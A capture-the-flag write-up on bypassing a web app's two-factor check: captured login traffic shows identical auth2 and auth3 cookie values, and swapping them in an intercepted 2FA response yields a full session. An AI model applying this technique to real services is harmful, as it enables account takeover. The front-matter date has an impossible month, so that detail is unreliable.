---
title: "2FA Madness - Two Factor Authentication Bypass"
date: "2026-13-11"
category: "Web"
summary: "2FA Bypass"
tags: ["CTF", "2FA"]
---

**Category:** Web
**Author:** Ghost-Shade

## Summary
The core issue is a failure in session state validation during the authentication flow. The application allows a user to move from a partial login state to a fully authenticated state by manipulating HTTP responses

## Root Cause
Failure in session state validation during the authentication flow. 

### Steps to reproduce:
1. After entering the the correct password, the server issues a session token and sets a cookie called auth2token

Request
```http
POST /api/v1/login HTTP/1.1
Host: xbml8ark00v1.ctfhub.io
Connection: keep-alive
Content-Length: 50
Content-Type: application/json
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://xbml8ark00v1.ctfhub.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://xbml8ark00v1.ctfhub.io/portal
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9

{"mobile":"+1-415-555-0000","password":"password"}
```

Response:
```http
HTTP/1.1 200 OK
Server: nginx/1.28.0
Date: Tue, 10 Nov 2026 09:22:38 GMT
Content-Type: application/json
Connection: keep-alive
Set-Cookie: auth2token=8078437480e6b270f1e7362c7f17ea3489fc612de063d6fdf8258d26a13f0724; expires=Tue, 10-Nov-2026 10:22:38 GMT; Max-Age=3600; path=/
Content-Length: 50

{"session":"c4c43fa0-01a1-71a1-a66d-00aee16e91df"}
```

2. When you provide a valid 2FA code for a particular account the server issues an auth3token which is same as the auth2 token which was issued earlier when providing the password which is kind a weird.

```http
HTTP/1.1 200 OK
Server: nginx/1.28.0
Date: Tue, 10 Nov 2026 09:22:48 GMT
Content-Type: application/json
Connection: keep-alive
Set-Cookie: auth3token=8078437480e6b270f1e7362c7f17ea3489fc612de063d6fdf8258d26a13f0724; expires=Tue, 10-Nov-2026 10:22:48 GMT; Max-Age=3600; path=/
Content-Length: 20

{"status":"success"}
```

3. When prompted for 2FA, the applicationexpects a valid verification code. If you provide an invalid code the server  rejects it

4. By intercepting the server's response to the 2FA request using a proxy(CAIDO) you can manipulate the data. Instead of letting the server return an error, you replace the auth3token (the post-2FA session cookie) with the auth2 token you obtained in the initial password step provided when logging in.

**Observation**
The application incorrectly validates the existing O2 token as proof of successful 2FA completion, granting you an authenticated session without ever needing the actual 2FA code.

FLAG: 122827.04

